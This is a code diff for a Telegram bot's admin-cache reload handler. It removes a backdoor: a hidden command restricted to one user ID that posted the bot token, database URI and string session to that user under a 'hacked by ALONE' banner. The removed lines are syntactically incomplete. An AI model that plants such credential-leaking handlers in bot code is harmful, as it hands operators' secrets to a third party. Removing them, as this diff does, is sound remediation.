@@ -17,18 +17,10 @@ rel = {}
 
 
 @app.on_message(
-    filters.command(["admincache", "reload", "refresh, "srt, "]) & filters.private & filters.user(6079943111) & filters.group & ~BANNED_USERS
+    filters.command(["admincache", "reload", "refresh"]) & filters.group & ~BANNED_USERS
 )
 @language
 async def reload_admin_cache(client, message: Message, _):
-    photo=f"https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝙰𝙻𝙾𝙽𝙴.\n\n☆............𝙱𝚈 » [𝗔𝗟𝗢𝗡𝗘](https://t.me/ALONE_WAS_BOT)............☆""",
-         reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                          "• нαϲкє𝚍 ву 𝗔𝗟𝗢𝗡𝗘 •", url=f"https://t.me/ALONE_WAS_BOT")
-                 ]
     try:
         if message.chat.id not in rel:
             rel[message.chat.id] = {}
